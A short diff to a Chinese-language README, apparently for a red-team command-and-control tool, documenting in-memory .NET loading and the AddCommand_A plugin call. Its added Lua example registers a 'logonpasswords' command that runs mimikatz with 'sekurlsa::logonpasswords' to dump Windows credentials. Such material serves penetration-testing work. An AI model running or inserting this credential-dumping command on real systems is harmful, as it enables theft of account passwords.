@@ -87,3 +87,9 @@ inline-assembly	                                   --内联加载.net文件
 execute-assembly                                   --Fork&&Run模式(创建子进程)进行内存加载.net文件
 ```
 
+AddCommand_W和AddCommand_A的区别在于：AddCommand_A打包了exe的使用参数，例如你可以直接将想直接使用logonpassword 
+
+```lua
+AddCommand_A("logonpasswords", mimikatz,"privilege::debug sekurlsa::logonpasswords exit","inline-execute","Get password credentials on windows", "logonpasswords" );
+```
+
